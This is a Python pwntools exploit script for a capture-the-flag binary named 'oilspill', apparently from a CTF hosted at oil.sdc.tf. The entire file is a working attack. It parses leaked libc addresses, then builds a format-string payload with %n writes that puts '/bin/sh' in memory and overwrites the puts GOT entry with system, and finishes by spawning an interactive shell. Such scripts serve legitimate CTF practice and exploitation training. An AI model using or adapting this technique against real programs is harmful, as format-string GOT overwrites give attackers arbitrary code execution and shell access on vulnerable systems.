from pwn import *;

if args.EXPLOIT:
    io = remote("oil.sdc.tf", 1337);
else:
    io = process("./oilspill");

def writechar(byte, address):
    global chars, payload, addr_offset, addrs;
    pad = b'';
    padding = (byte - chars);
    if padding < 10:
        padding += 256;
    pad = b'%' + bytes(str(padding), "ascii") + b'u';
    chars = (chars + padding) & 0xff;

    w = b'%' + bytes(str(addr_offset), "ascii") + b'$n';
    payload += pad + w;
    addrs += p64(address);
    addr_offset += 1;

def write(string, address):
    for ch in string:
        writechar(ch, address);
        address += 1;

libc = ELF("./libc.so.6");
file = ELF("./oilspill");
stack_offset = 8;
buf_offset = 21;
addr_offset = stack_offset + buf_offset;
payload = b'';
chars = 0;
addrs = b'';
main = 0x40068a;
target = 0x600c80;

dyn_puts = int(io.recvuntil(b',')[:-1], 16);
io.recvuntil(b' ');
dyn_printf = int(io.recvuntil(b',')[:-1], 16);
io.recvuntil(b' ');

print("FILE PUTS ADDRESS: " + hex(file.got['puts']));
print("DYNAMIC PUTS ADDRESS: " + hex(dyn_puts));
print("DYNAMIC PRINTF ADDRESS: " + hex(dyn_printf));
print("LIBC PUTS OFFSET: " + hex(libc.symbols['puts']));

# libc address is dynamic address - static offset
# one way to check that you are calculating the libc address correctly
# the libc base is always 4kb aligned, meaning that the last 12 bits are always zero
libc.address = dyn_puts - libc.symbols['puts'];
print("LIBC ADDRESS: " + hex(libc.address));

write(b'/bin/sh\x00', target);
write(p64(libc.symbols['system']), file.got['puts']);

payload = (payload.ljust(buf_offset * 8, b'_') + addrs);

# the program only reads 300 bytes
assert(len(payload) < 300);

print(io.recv());
io.sendline(payload);

# yay shell
io.interactive();